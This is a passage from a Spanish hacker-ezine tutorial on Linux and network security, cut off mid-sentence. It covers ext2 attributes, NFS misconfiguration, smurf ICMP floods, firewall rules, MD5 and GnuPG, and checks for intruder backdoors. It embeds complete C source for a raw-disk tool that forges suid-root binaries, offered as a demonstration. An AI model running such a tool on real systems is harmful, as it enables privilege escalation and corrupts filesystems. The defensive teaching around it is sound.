@@ -1,0 +1,914 @@
+/-----------------------------------------------------------------------\
+|-[ 09 ]----[ Seguridad en Linux (II) ]----[ Medio/Alto]----------------|
+\------------------------------------------------------------[ Trycky ]-/
+
+
+-=( trycky )=-.-=( Seguridad En Linux y Red )=-.-=( Segunda Parte )=-
+
+-=( 01 )=- A cerca de ...
+-=( 02 )=- Introduccion ...
+-=( 03 )=- Sistema de Archivos .
+-=( 04 )=- ICMP "Internet Control Message Protocol" .
+-=( 05 )=- Linux PAM "Pluggable Authentication Modules for Linux"
+-=( 06 )=- Firewall mas a fondo .
+-=( 07 )=- Algunos metodos criptograficos .
+-=( 08 )=- Comprobaciones tipicas .
+-=( 09 )=- Quien nos ataca .
+-=( 10 )=- PSA (Pachanga Script Admin) .
+-=( 11 )=- Parches para el Kernel .
+-=( 12 )=- Enlaces interesantes .
+
+-=( 01 )=--=( A cerca de ... )=-
+
+Doy todo el derecho a distribuir este documento aunque si no lo diera tambien
+lo harias osea que respeta por lo menos el contenido y deja al autor si
+encuentras algun faño corrigelo y mandame una copia . Perdonarme las faltas
+ortograficas por lo de las tildes , supongo que sobrevivireis.
+
+Si quereis contactar conmigo me podreis encontrar en el Irc-Hispano con el
+nick de trycky. Se recomienda leer con algun editor desde la terminal veamos
+como el emacs tal vez digase por su comodidad . Los Guin words abtenerse. 
+Y de paso darle las gracias a quien tu ya sabes por estar ayudandome en muchas 
+cosas thx :) y al canal #root y #huetor_berga x) .
+                   
+-=( 02 )=--=( Introduccion ... )=-
+
+En este articulo que es una sucecion de segurida en linux primera parte vamos
+a dar por echo que se tienen conocimientos basicos a explicar algunas cosas
+mas complejas o no tan complejas voy a terminar de explicar muchas cosillas
+que se me quedaron sin explicar como el NFS ( Network File System) y algunas
+cosas mas muchas cosas que se explican aki son posibles para mas S.O los atakes
+de flood con el ICMP son posibles en todos los S.O . Sip hasta en nuestro 
+queridisimo linux no se libra (ni linux ni ningun otro). Muchos agujeros de 
+seguridad a qui explicados son algo antiguos pero no es ta mal eso de saber mas
+E intentare profundizar con ciertas cosas de mas nivel aunque me dejo mucho en
+el tintero xP .
+
+Otra cosa que ma salido mal como todas las que hago es que e ido incluyendo 
+cosas paulativamente y ha quedado algo desordenado y por que tambien el 
+dococumento estaba escrito hace ya tiempo y he ido agregando cosas y me ha 
+quedado algo engoroso osea que para los que lo leais y os parezca malo 
+mandarme un mail y me comentais ;) .
+
+-=( 03 )=--=( Sistema de Archivos )=-
+
+-=( EXT2 atributos especiales )=-
+
+Sobre el sistema de archivos EXT2 podemos hacer ciertos cambios a ficheros
+y de esa forma podemos bloquear la escritura / borrado de un fichero hasta
+cambiarle una flag para cuando se haga un backup de HD no se incluya esa 
+parte. Todas estas operaciones se pueden hacer con 'chattr' para cambiar los
+modos y 'lsattr' para visualizar los modos. A continuacion doy un listado 
+de lo modos a usar para 'chattr' el uso de chattr es mu simple :
+
+chattr +-[ASacidsu] archivo 
+
+Si se quieres restaurar todos los modos de un fichero se usaria :
+
+chattr = archivo 
+
+Lista de modos :
+
+A :
+S : Se borra el fuchero y se pone los bloques a zero se sincronizan los cambios
+a : El archivo se fija de modo que solo se puede agregar sobre el (append only)
+c : El archivo se comprime si se acceda al mismo el kernel lo descomprime
+i : No se podra borrar ni renombrar el fichero hasta q se vuelva kitar la flag
+d : Se fija el archivo para que no se reconozca en lo backups por el 'dump'
+s : Se borra el fichero y los bloques son puestos a zero 
+u : Si se borra el fichero se crea una copia %backup%~ 
+X : Este se usa para marcar los direcotorios a exportar con "TCFS" 
+
+lsattr : Con 'lsattr' se podra visualizar los modos de un archivo con la flag
+'-l' ojo esto solo sirve para el sistema de archivos ext2 los del RaiserFS a
+fastidiarse supongo . Espero que el futuro ext3 traera compatibilidad y 
+mejoras x) .
+
+Tambien me hubiera gustado explicar las posibilidades del ext2 y del propio
+kerlen von el VFS (virtual file system) .
+
+Ahora adjunto un source que no tiene nada que ver con lo explicado antes pero 
+con este se podrian camibar los modos de los archivos modificando en el estado
+puro de la particion algo mu peligroso teneis que tener permisos para montar y 
+desmontar el HD aunque se recomienda hacer las pruebas en un disquete :
+
+<++> rawpowr.c
+
+/*
+ * rawpowr 0.1, Jan 2000 by Mixter
+ *
+ * This tool will try to read inode tables from a ext2 partition in raw mode,
+ * and change bytes that indicate umask 755 for a file to umask 4755. It could
+ * be used to create suid root binaries from any files on a ext2 filesystem
+ * that can be written to. This demonstrates that most block devices should
+ * not be directly accessible by users at any time, and that systems should be
+ * run under a securelevel where raw access to such devices is impossible.
+ *
+ * WARNING! WARNING! WARNING! This not only performs raw operations on your
+ * harddisk, but also very sloppy ones (i.e. replace occurences of a special
+ * byte with another one, without honoring the ext2fs structure). Do NOT use
+ * this on active or mounted partitions! Do NOT use this on partitions with
+ * valuable non-backed-up data. I suggest you try this with a ext2fs floppy
+ * disk. I am not responsible for any damages this thingie might cause :).
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+/* This is the offset where my first file on a "virgin" ext2fs
+   was located. This offset is relatively tiny, and therefore, probably
+   only the first few binaries in the root directory get chmod +s'ed */
+
+#define E2_DATA_START   278528
+#define E2_MODE_755     '\x81'
+#define E2_MODE_4755    '\x8d'
+
+void
+ewsage (char *x)
+{
+  printf ("usage: %s <writable block device>\nthis tries to change normal files
+to suid binaries\n", x);
+  exit (0);
+}
+
+int
+main (int argc, char **argv)
+{
+  char inodes_raw[E2_DATA_START];
+  int effdee;
+  long r, i;
+
+  if (argc != 2)
+    ewsage (argv[0]);
+
+  (void) sync ();
+
+  printf ("rawpower by Mixter\nWarning: this program performs dangerous operations on block devices...\n\t Hit ctrl+c to terminate now!\n");
+  sleep (5);
+
+  if ((effdee = open (argv[1], O_RDWR)) == -1)
+    {
+      perror ("opening filesystem");
+      ewsage (argv[0]);
+    }
+  printf ("Reading from device...");
+  r = read (effdee, inodes_raw, E2_DATA_START);
+  printf (".");
+  if (r < E2_DATA_START)
+    r += read (effdee, inodes_raw + r, E2_DATA_START - r);
+  printf (".");
+  if (r < E2_DATA_START)
+    r += read (effdee, inodes_raw + r, E2_DATA_START - r);
+  printf (".");
+  if (r < E2_DATA_START)
+    r += read (effdee, inodes_raw + r, E2_DATA_START - r);
+  printf (".");
+  if (r < E2_DATA_START)
+    r += read (effdee, inodes_raw + r, E2_DATA_START - r);
+  printf (".\n");
+
+  for (i = 0; i < E2_DATA_START; i++)
+    {
+      if (inodes_raw[i] == E2_MODE_755)
+        {
+          inodes_raw[i] = E2_MODE_4755;
+          printf ("Changing possible permission byte at offset: %ld\n", i);
+        }
+    }
+
+  lseek (effdee, 0, SEEK_SET);
+
+  printf ("Writing to device...");
+  i = write (effdee, inodes_raw, r);
+  printf (".");
+  if (i < r)
+    i += write (effdee, inodes_raw + i, r - i);
+  printf (".");
+  if (i < r)
+    i += write (effdee, inodes_raw + i, r - i);
+  printf (".");
+  if (i < r)
+    i += write (effdee, inodes_raw + i, r - i);
+  printf (".");
+  if (i < r)
+    i += write (effdee, inodes_raw + i, r - i);
+  printf (".\n");
+
+  close (effdee);
+  (void) sync ();
+
+  printf ("Synching disk, done! (Now try: find /mountpoint -perm 4000)\n");
+
+  return 0;
+}
+
+<-->
+
+-=( NFS "Network File System )=-
+
+Que es el Network file system a partir de ahora NFS no NTFS que hubo unos 
+personajes que se creian que era lo mismo ademas lo decian totalmente 
+convencidos, el NTFS es el sistema de archivos de los S.O NT si ese que es
+mejor que linux si claro digaser con ironia que despues hay gente que se lo 
+cree y todo . Voy a explicar primero el NFS y despues algunos de sus fallos 
+que mas que fallos son descuidos de administracion .
+El nfs es un sistema de archivos de red que trabaja con el tcp/ip y sirve para
+poder montar discos duros en una red digamos que tenemos 3 maquinas podemos
+montar sus respectivos discos duros en el ordenador principal se puede hacer
+al arancar na mas el sistema a traves del "/etc/fstab". Bueno lo primeo que
+hay que hacer para poder montar el NFS es ver si tenemos los demonios 
+instalados en este caso seria el rpc.mountd y el rpc.nfsd cada distribucion
+suele traer su propio script para el aranque en /etc/rc.d/nfserver o nfs .
+El nfs esta basado en el RPC y estos se cargar al arankar la makina y se ha
+de tener ejecutando el rpc.portmap o portmap a secas . Bueno ahora la 
+explicacion de donde lee el sistema para saber de donde puede dejar pasar para
+montar las particiones y estos se incluyen en el archvio "/etc/export" ahora 
+pondre algunos ejemplos :
+
+Lepton:/etc # cat exports
+# Como vemos admite los comentarios de toda la vida del tipo script
+
+/home tsnumai(rw) lepton(rw)
+/usr/src tsunami(rw) lepton(rw)
+
+En este ejemplo permitimos poder exportar a tsunmi un ordenador de mi red el 
+directorio "/home" y "/usr/src" como lectura y escritura (rw) lectura simple
+seria (ro) .Queda claro que tsunami lo tenemos configurao en "/etc/hosts" si
+no sabeis como se hace leeros el seguridad linux 1 del anterior numero del
+zine. Ahora dare un lista de flags para poner en el "/etc/export" :
+
+rw : Modo de lectura y escritura
+ro : Modo de lectura
+insecure : Permite el acceso sin identificarse
+secure : Neitas identificarte para esa makina mediante el RPC
+root_squash : Asigna cualquier solicitud desde el usuario root
+no_root_squash : No asigna ningua peticion desde la uid 0 (root)
+
+Esta son algunas hay mas pero estan son las que neitamos por ahora. Ejemplo :
+
+Lepton:/etc # cat exports
+# Aki un ejemplo peligroso
+/ (ro,insecure,root_squash)
+
+Si tienes esta linea en tu archivo mas mal debido a que cualquier persona se
+puede montar tu hd en el suyo.Y que este es uno de los aguejeros de seguridad
+mas famosos del nfs. Ahora biene como podemos saber info del rpc pos mu facil
+con la utilidad "rpcinfo -p host" el flag -p sirve para indicar el nombre de
+una makina tambien nos puede ayudar el comando showmount que te dice los 
+directorios que puede exportad una maquina . Y si tiene el faño de arriba esta
+claro que es facil de hacer por cierto se pueden montar desde mount -t nfs el
+-t de toda la vida para especificar el sistema de archivos nfs tendreis que
+tener Kernel con opcion a este sistema de archvio o por lo menos crearos el 
+modulo y lo instalais cuando eso y despues lo volveis a borrar .
+
+Otra cosa que tambien se puede usar sistema de autentificacion kerberos por el
+nfs en vez de poner "secure" que usaria el estandard de DES podriamos poner 
+"kerberos" y utilizariamos este sistema de criptografia .
+
+Para saber si una makina puede exportar direcotorios haremos uso de la utilidad
+de "showmount" .
+
+Y lo ultimo que se me olvidaba para montar las particiones con nfs seria :
+
+mount -t nfs -o timeo=25,intr 192.168.0.10:/var/tmp /var/tmp
+
+Para tener mas seguridad en NFS dado que estos mueven los datos en texto sin
+cifra podemos usar el TCFS que se describe en la seccion 7 de algunos sistemas
+criptograficos ;) .
+
+-=( 04 )=--=( ICMP "Internet Control Message Protocol" )=-
+
+Este protocolo el Internet Control Message Protocol que traducido al castellano
+seria el Protocolo de Internet de Mensajes de Control . Y en un principio fue
+creado para saber el estado de una red por ejemplo al hacer un ping os dareis
+cuenta de que habra al final una apartado que pone time ese sera el retardo
+que hay en que llege ese pakete y en que lo conteste tambien llamado lag.
+
+PING localhost (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=255 time=0.590 ms
+
+En este ejemplo se envia un pakete solamente a mi propia makina y tiene un
+retardo minimo debido a que bueno usar la cabeza y fijaros en la IP. 
+La utilidad mas usada para el uso del ICMP es el ping pero teneis que tener
+en cuenta una cosa de que el ping solo envia paketes ECHO_REQUEST y la makina
+responde ECHO_REPLY . Aunque hay muchos tipos de cabezeras tambien hay muy 
+buenos programas que traen un amplio de uso del icmp uno es el icmpush un 
+programa bastante bueno pero no recuerdo de donde me lo baje.
+Aunque lo que yo quiero explicar aki es explicar todos los DOS que hay usando
+este protocolo como el famoso smurf que lo que hace es mandar muchos paketes
+a una makina con lo que esta sufrira un pequeño DOS o no tan pequeño no me 
+moy a meter en materia del propio protocolo ICMP por que esto daria un extenso
+documento y ya hay muchos .
+
+Bueno pues vamos a explicar el famoso smurf que tanto dolores de cabeza ha dado
+por supuesto es mu facil evitarlo simplemente denegando el protcolo ICMP pues
+esto se podria hacer con el ipchains si no sabeis lo que esto leer numeros 
+anteriores del ezine , Esto bloquearia el protocolo ICMP :
+
+ipchains -A input -p icmp -j DENY 
+
+Pero a ki no queda esto una cosa que se me quedo en el tintero del doc pasado
+de los firewalls es que el ipchains puede denegar a tipos de protocolos ICMP
+para ver la lista puedes poner ipchains -help icmp . Por ejemplo si queremos
+denegar los echo replys quedaria algo a si : 
+
+ipchains -A input -j DENY -p icmp -s ! 127.0.0.0/255.255.255.0 8 -l
+
+Denegara a todo el mundo dentro del protocolo ICMP a los echo-request (ping)  
+y de paso lo logeamos a traves del syslogd para mayor seguridad y ver quien nos
+toca la moral .
+
+Tambien se puede denegar el traceroute siendo los mismo q la linea de arriba
+pero denegando el ICMP de bloque 33 .
+
+Ahora dare una lista menorizada de cada numero :
+
+echo-reply (pong)
+destination-unreachable
+source-quench
+redirect
+echo-request (ping)
+router-advertisement
+router-solicitation
+time-exceeded (ttl-exceeded)
+parameter-problem
+timestamp-request
+timestamp-reply
+address-mask-request
+address-mask-reply
+
+Dentro de cada uno de estos hay mas opciones por eso si haceis saldreis de 
+dudas y os saldra toda la lista :
+
+Lepton:~ # ipchains -help icmp
+
+Si no teneis el ipchains y quereis seguir viendo todos los bloques donde 
+vendran si no en su libreria de alguna parte el los lee no ? . Esta se haya
+en "/usr/include/netinet/ip_icmp.h" .
+
+Y ahora que es lo que hace el tan famoso papa-smurf que traducio significaria 
+algo como papa pitufo . Y lo que hace este programa mandar muchos pero que 
+muchos y cuando digo mucho me quedo corto echo request que no es mas que el 
+ping y en cuestion de 30 segundos envio unos 6000 paketes que son pocos nop
+y que ademas usa un archivo con broadcast y que son las broadcast son makinas
+que vuelven a mandar un broadcast le manda un pakete y echa lo renvia pues si
+le añadimos esto ya nos quedamos con que el smurf es mu util para relentizar
+las conexiones y si las relentiza tanto que no le da tiempo ni ha responder
+a ciertas peticiones le daran por muerto y lo ignoraran por lo que se podria
+caer del irc , Esto es simple pero mortifero aunque tiene solucion mas que 
+simple , para la solucion lease arriba pero tambien hay mas formas de parar
+el famoso smurf sin necesidad de recurrir al firewall esto se debe a que el 
+smurf hace uso de las broadcast y nuestro Kernel de linux es un sistema serio
+y por medio del "sysctl" podriamos cambiar bastantes parametros para que 
+hiciese caso omiso a las peticiones de estas :
+
+lepton:~ # sysctl -A | grep broadcasts
+net.ipv4.icmp_echo_ignore_broadcasts = 0
+
+Con esto nos damos cuenta que trae por defecto no ignorar a los icmp echo de 
+alguna broadcast pues mu facilmente ponemos :
+
+lepton:~ # sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
+net.ipv4.icmp_echo_ignore_broadcasts = 1
+
+Y ya estara todo en orden para ver la capacidad de "systcl" a fondo nada mas 
+que pongas :
+
+lepton:~ # sysctl -A | less
+
+O tambien man sysctl ;) .
+
+Para el systcl que sirve para cambiar los valores del Kernel en tiemepo de 
+ejecucion deberemos tener compilado el nucleo para ello con la opcion de 
+Sysctl Support .
+
+lepton:/usr/src/linux # cat .config | grep CONFIG_SYSCTL
+
+CONFIG_SYSCTL=y
+
+Y si no la teneis ya sabeis a compilar sa dicho.
+
+Una cosa quiero dejar clara el ataque del smurf no se puede parar por lo menos
+a modo usuario y con este firewall y denegando los icmp provenientes de broadz
+lo unico que podemos hacer es resister mas el ataque que algo es algo el propio
+filtrado del ataque lo tiene que hacer nuestro ISP . 
+
+Si no quereis molestaros en usar el sysctl pos os vais a "/proc/sys/*" y lo
+echais un vistazo.
+
+El sysctl en algunos casos lo unico que hace es :
+
+echo 1 > /proc/sys/*
+
+Donde "*" seria el fichero a marcar ;) .
+
+Bueno algo mas del ICMP tambien estaba haciendo un programa para saber el S.O
+por medio del icmp aunque esto es algo inexacto por que seria por medio de que
+cada Sistema Operativo de por si da a responder ciertos paketes y otros no es 
+el caso del Windows que si le pides un paquete ICMP timestap te responde a 
+bolea xP umm ya sabeis todos que la Pila TCP/IP del Windows se programa en dos
+lineas : return /dev/random; xD mas o menos tonces si vemos que esa Maquina 
+nos responde aleatoriamente a los paquetes timestap pos sabremos claramente que
+es un windows otra cosa es que este bloqueado el ICMP tonces ya nos serviria de
+poco a qui lo explicado .
+
+Entonces si sabemos que cada S.O responde de una forma o otra podriamos hacer
+un programa que fue sacando estas conclusiones "ICMPos" x) lo taba haciendo
+si me da tiempo terminarlo lo saco pal zine pero de toas formas es mu cutre.
+
+Otra cosa de como se puede averiguar el S.O por medio de un ICMP es que cada
+nucleo del sistema operativo como explique antes responde de una forma u otra
+al igual que el Windows devuelve como le da la gana en ciertos tipos de 
+peticiones ICMP tiene unos limites asociados es decir el kernel del linux tiene
+un limite de ICMP unreachable de 80 en 4 segundos y un 1/4 de retraso si se 
+sobrepasa este limite dejaria de responder y tambien en la cabezera que te 
+devuelven el pakete mas el mensaje de error y algunos S.O suelen variar todos
+los cambios de la cabezera IP teniendo estos datos previamente conocidos
+podriamos saber de que S.O se trata.
+
+Sobre el ICMP nada mejor que leerse su RFC por que para que voy a explicar 
+todas las caracteristicas .
+
+RFC : 792 , 1122 .
+
+-=( 05 )=--=( Linux PAM "Pluggable Authentication Modules for Linux" )=-
+
+Que es el pam son modulos de autentificacion para linux es decir son librerias
+que se pueden usar sobre ciertos programas como "login" por ejemplo . Que nos
+sirven para tener un correcto sistema de identifiacion y una ciertas reglas 
+para el proceso de autentificacion podemos controlar el numero de intentos cada
+tantos intentos fallidos le denegase la entrada por x segundo etc y todo esto
+sin la necesidad de volver a compilar los programas . 
+
+Toda la configuracion del PAM se encuentra en :
+
+/etc/pam.conf 
+
+Aunque tambien ahora lo tienen distribuido por "/etc/pam.d/*" .
+
+http://www.kernel.org/pub/linux/libs/pam/index.html
+
+Actualmente se encuentran modulos para muchos programas :
+
+ProFTPD
+Samba
+Squid
+sudo
+SRP
+
+Y un largo etc .
+
+-=( 06 )=--=( Firewall mas a fondo )=-
+
+A qui solo explicare cosas algo mas complejas de las cuales me he documentado
+pero que a un a si no las domino del todo y muchas son gracias a el How To del
+Ipchains y algun doc que me encontre por ahi .
+
+Ahora explicare el TOS ( Type Of Service) que es una propiedad del IP por la
+cual da mayor o menor importacia en la salida de un paquete por ejemplo si
+queremos tener una maxima prioridad a el FTP que consume mas ancho de banda
+y dejar con menos ancho de banda a las News por ejemplo o a cualquier otro 
+servicio digamos por ejemplo que si tenemos un servidor web en una maquina lo
+login serria darle toda la prioridad al WWW y denegar el resto . 
+
+Doy una pequeña lista con los valores correspondientes :
+
+       TOS Name                Value           Typical Uses
+
+       Minimum Delay           0x01 0x10       ftp, telnet
+       Maximum Throughput      0x01 0x08       ftp-data
+       Maximum Reliability     0x01 0x04       snmp
+       Minimum Cost            0x01 0x02       nntp
+
+Ejemplo para que tenga minimo retardo los paquetes con destino el IRC/6667 :
+
+ipchains -A output -p tcp -d 0.0.0.0/0 6667 -t 0x01 0x10
+
+Tambien se podria poner de esta forma definiendo en "/etc/services" :
+irc	6667/tcp
+
+ipchains -A output -p tcp -d 0.0.0.0/0 irc -t 0x01 0x10 
+
+Pero si lo que queremos es dar maximo retardo a los paquetes del ftp :
+
+ipchains -A output -p TCP -d 0.0.0.0/0 ftp -t 0x01 0x02
+
+Mas documentacion acerca de las cabezeras IP : rfc791
+
+Tambien explicar algo del NetFilter el nuevo firewall para los nucleos 
+2.3.x & 2.4.x .
+
+El netfilter usa de programa re administracion del firewall el Iptables que
+una empresa contrato al creador del ipchains para que lo hiciese su uso la 
+verdad que no distingue mucho del de ipchains se han añadido nuevas mejoras
+como poder administrar las reglas NAT desde el iptables y poder hacer un 
+router NAT con el kernel y el netfilter . Bueno ante todo decir que el NAT
+sirve para hacer el ip masquerarding es decir si tenemos una red interna de 
+tres maquinas : 192.168.1.{1-2-3} y nuestra ip publica hacia internet es :
+62.66.66.2 . Lo que se encargaria el NAT seria encapsular la ip 192.168.1.2 
+por ejemplo y convertirla en 62.66.66.2 que haria un consulta a playboy.com
+por ejemplo . Otra cosa que se puede hacer con el netfilter "iptables" es 
+conseguir que un puerto de la ip publica 62.66.66.2 se rediriga hacia otra
+maquina de la intranet como podria ser :
+
+IP_CUALQUIERA -> <- 62.66.66.2:8080 -> <- 192.168.1.3:80
+ 
+De todas formas no deseo alargarme mucho por que para eso estaba haciendo otro
+documento. Por lo que espero haber dejado todo un poco mas claro .
+
+Y otra cosa a destacar en iptables es le sistema de logeo dado que con ipchains
+se daba a desear algo mas.
+
+Otra cosa que me pidieron que dijese es cuando denegais el syn globalmente y
+si entrais al irc en algunos servidor os chekean si teneis abierto el 1080 
+socks y el 113 para el ident . Lo que unico que hay que hacer es mandar un 
+reject al servidor de irc para que os de como que no teneis cerrado , esto es
+debido a que si cortamos el "syn" que es la flag de peticion de conexion el
+servidor de IRC nos estara un buen rato atosigando haber que pasa con esos 
+puertos xD , os pongo las reglas :
+
+IPCHAINS :
+
+ipchains -A input -j REJECT -p tcp -d 127.0.0.0/2 1080
+ipchains -A input -j REJECT -p tcp -d 127.0.0.0/2 113
+
+IPTABLES :
+
+iptables -A INPUT -j REJECT -p tcp -s 0/0 1080
+iptables -A INPUT -j REJECT -p tcp -s 0/0 113
+
+Otra cosa que trae el iptables "netfilter" es la opcion matches con la que 
+se podra meter un limite , por ejemplo :
+
+iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT
+
+Esto limitara el syn a 1 por segundo y se podra evitar el syn flooding .
+
+Para no dejarlo para otro documento las reglas basicas para denegar el ICMP
+con el iptables es practicamente igual que en ipchains :
+
+iptables -A INPUT -s 0/0 -p icmp --icmp-type 8/13/33 -j DROP -l
+
+Solo que ahora cuando queramos especificar el tipo de icmp se debera de hacer
+con la flag "--icmp-type" . 
+
+Si quereis saber algo mas del netfilter pos en : croot.digicode.org , di una 
+charla sobre netfilter .
+
+-=( 7 )=--=( Algunos metodos criptograficos )=-
+
+Por lo primero decir que useis el PGP en especial GnuPG por ser GNU . No voy
+a dar una explicacion del PGP por que esta mas que vista y si no a buscar que
+ya hay mucha . Ahora explicare que es el MD5 , HASH y algo sobre el CFS .
+
+-=( MD5 )=-
+
+El MD5 no es un sistema de criptrografia por asi decirlo nos sirve para dar
+un pequeño resumen de un fichero y a si saber mas adelante si ese fichero a 
+sido cambiado o sigue siendo el original digase que si alguien consigue entrar
+en nuestra maquina y consigue meter un troyano en forma de cierta programa
+nos seria dificil darnos cuenta pero por medio del MD5 con solo hacer una tabla
+con todos los programas y despues la comparamos ;) . Y si algo falla ya sabes
+a recompilar aunque la solucion mas usada es usar CFS y que todos los binarios 
+o la mayoria esten en un Cd-Rom y cada cierto tiempo ir cambiando este Cd-Rom
+por versiones mas nuevas total pa lo que vale un CD. Aunque no hay que llegar
+a casos tan extremos. Bueno decir que el MD5 taba basado en el MD4 y este a su
+vez en el crc32 creo.
+
+Ahora explicare su uso :
+
+lepton:/bin # echo "trycky dice hola" > mirame
+lepton:/bin # md5sum * > md5_lista
+lepton:/bin # md5sum -c md5_lista
+
+Con lo que ahora ya tenemos un fichero con todos los cheksum creados falta ver
+si de verdad funciona por lo que haremos lo siguiente .
+
+lepton:/bin # echo "trycky dice holo" > mirame
+lepton:/bin # md5sum -c md5_lista | grep FAILED
+mirame: FAILED
+md5sum: WARNING: 1 of 86 computed checksums did NOT match
+
+Como vemos es funciona y de buena manera , yo creo ha quedado bien claro el
+uso del MD5 de todas formas a lo mejor me dejo algo en el tintero pero si eso
+na mas que me deis un toque al mail y me contais las penas .
+
+ftp donde esta el MD5 :
+ftp://ftp.cerias.purdue.edu/pub/tools/unix/crypto/md5
+
+Para mas info del MD5 : RFC 1321
+
+-=( CFS )=-
+
+El CFS sistema de ficheros criptografico al castellano seria un programa
+que trabajaria sobre el sistema de archivos sin necesidad de altearar el 
+nucleo del Linux . La criptografia que usa el CFS es un tipo de DES modificao.
+Con el CFS podriamos tener encriptados todo un directorio y ser claramente 
+mas seguro en contra podriamos decir que se puede hacer algo pesado pero su
+uso es mu seguro en servidores mereceze la pena por que nos podriamos proteger
+de posibles archivos modificados como troyanos en forma de su,mount,etc. Otra
+cosa es llevarlo todo con MD5 y ver viendo si concuerdan .Para que el CFS 
+puedad trabajar necesitamos tener instalado el portmapper dado que usa el RPC
+y habra que añadir otras lineas que si las quereis saber leeros el how-to
+dado que en el se explica todo detalladamente . Solo he querido dar una idea
+de lo que es el CFS .
+
+ftp://ftp.mathematik.th-darmstadt.de/pub/linux/okir
+
+-=( TCFS )=-
+
+TCFS que significa "Transparent Crypthografic file system" es una utilidad para
+linux no toy seguro si hay para otros sistemas ( la razon de el por que el TCFS
+es solo para linux es debido a que se usa atraves del sistema operativo al 
+contrario que el CFS por ejemplo que no hay que parchear el servidor si no que
+simplemente es un programa que se pone entre el sistemas de archivos y el 
+kernel ) , que sirve para cifrar datos de programas que usen la red es decir 
+NFS por ejemplo , dado que el NFS manda todos los datos en modo texto sin 
+cifrar y claramente no es mu seguro el TCFS guarda el texto cifrado y cuando 
+va a ser leido lo descifra por lo que todo el trabajo es realizado por la 
+makina cliente , pues debido a esto tendremos que tener trabajando en el 
+servidor el demonio "xattrd" y despues en cada maquina cliente deberemos de 
+añadir un password para cada usario que dese exportar directorio NFS y esto
+se hace por "tcfsgenkey" , que genera una clave y la encripta usando DES y ya
+tras esto nos identificamos por medio de "tcfslogin" y le pasara el password
+al kernel y para borrar el password nada mas que ejecutemos "tcfslogout" .
+
+http:// 
+
+-=( PGP )=-
+
+Bueno ahora explicare como crear un llave publica con el GnuPG supongo que 
+todo el mundo sabe lo que es el PGP (Pretty Good Privacy) aunque nosotros nos
+vamos a usar GnuPG que es compatible con el estandard OpenPGP y ademas no tiene
+restricciones . El PGP se basa en le sistema de llave publica y privada si no
+sabeis lo que hay muchos docs que lo explican ;) . Yo me remitire a usar el 
+GnuPG . Lo primero sera generar nuestra llave .
+
+lepton:~ # gpg --gen-key
+
+Con esto y tras unas preguntas mu simplonas se nos habra generado nuestras 
+llaves .
+
+lepton:~ # gpg -a --export -o archivo.asc
+
+Al ejecutar esto habremos exportado nuestra llave publica para que el resto 
+de la gente pueda encriptar mensajes , etc . Y solo nosotros podremos desen-
+cryptarlos eso quedaba claro xD .
+
+Ahora cuando recivamos un mail encryptado por ejemp existen ya multitud de 
+programas que no lo desencriptarian al vuelo un claro ejemplo es el Kmail 
+aunque tambien tenemos un modulo pal queridismo emacs que se llama 'mew' tmb
+hay algunos programas para llevar el control de todas las llaves publicas 
+como puede ser KpgpKeys , gpgp . Que es mas comodo que tener que ir viendolas
+con :
+
+lepton:~ # gpg --list-key
+
+www.gnupg.org 
+
+RFC : OpenPGP
+
+-=( 8 )=--=( Comprobaciones tipicas )=-
+
+Pues por ejemplo si tenemos una makina en la cual han conseguido entrar o lo
+que sea o simplemente eres paranoico total pos es simple lo primero seria 
+comprobar que todos los programas con set-suid por que casi todo el mundo 
+cuando gana root en una makina se dedica a meter copias de la bash o programas
+que la llamen con la set-suid activada , si el admin no es muy espabilado vale
+pero otras veces hay que currarselo mas por eso estoy haciendo otro documento
+muy interesante volviendo al asunto . Si queremos buscar todos los ficheros con
+setduis activadas seria con :
+
+lepton:~/Administracion # cat > suids.sh ; chmod +x suids.sh
+#!/bin/bash
+if [ -f "suid.txt" ]; then
+    cp suid.txt suid_old.txt
+fi
+
+find / -perm 4000 >> suid.txt
+find / -perm 4700 >> suid.txt
+find / -perm 4777 >> suid.txt
+find / -perm 4770 >> suid.txt
+find / -perm 4755 >> suid.txt
+find / -perm 4750 >> suid.txt
+find / -perm 4751 >> suid.txt
+find / -perm 4500 >> suid.txt
+find / -perm 4555 >> suid.txt
+find / -perm 4550 >> suid.txt
+find / -perm 4551 >> suid.txt
+
+lepton:~/Administracion #
+
+Y de ahi podemos o comparar con otra lista de set-suids anteriores y ver que
+diferencia hay. 
+
+Por ejemplo :
+
+Otra cosa es mu comun añadir en el archivo de password una entrada con la linea
+de la uid en 0 con lo que se conoraria como root nas mas meter el passwd a 
+veces no le ponen ni password xD .
+
+Para buscar entradas con UID o GUID 0 :
+
+Lepton:/etc # cat passwd | grep -n :0:
+
+Ahora algunas comprobacions por si usamos alguna utilidad de la familia rlogin
+no taria mal ir viendo como anda el .rhost de vez en cuando :
+
+lepton:~/Administracion # find /home /root -name .rhosts -print
+lepton:~/Administracion # find /home /root -name .rhosts -exec grep "+ +" {} \;
+
+Pero de todas formas no os recomiendo usar el rhost , Si quereis tener una red
+medianamente segura lo mejor es no confiar en ninguna maquina .
+
+Por cierto estoy programando una coleccion de scripts que automatizan todas
+estas tareas haber si me da tiempo y lo meto todo ;) .
+
+Y como ya explique el MD5 pos os vais comprobando cada cierto tiempo pero tmp
+es plan de montarse una fortaleza. 
+
+Otra cosa que tambien viene bien hacer es ocultar la version de los daemons
+por ejemplo si tenemos un Proftpd a quien le interesa la version que esta 
+ejecutandose en mi maquina ;) hay que tener en cuenta que muchos escanners de
+rede como el Nessus por ejemplo si ocultas la version se desorienta rapidamente
+por lo que nada mas teneis que bajaros el Codigo Fuente del programa y 
+recompilar veamos un ejemplo para buscar la cadena del version .
+
+Tenemos el source de un apache 1.3.12 y queremos saber donde esta esactamente 
+la linena que indica el numero de version pos nada mas que hacer esto :
+
+lepton:/usr/tmp/apache # find -name "*.[ch]" -exec grep -n -H 1.3.12 {} \;
+
+./src/include/httpd.h:430:#define SERVER_BASEVERSION "Apache 1.3.12"
+
+Te aparaceran mas lineas pero las e omitido por simplemente con ir y cambiar
+esa linea por otra que os guste mas ;) .
+
+Yo tengo puesto :
+
+#define SERVER_BASEVERSION "IIS 2.0"
+
+Pero no os lo recomiendo por que se os llenara de script kiddies teniendo la
+ayuda de dios de haber si os consiguen entrar. Aunque yo nunca e visto un 
+iis 2.0 pero bueno. (Para los que no lo sepais el IIS es el servidor web de 
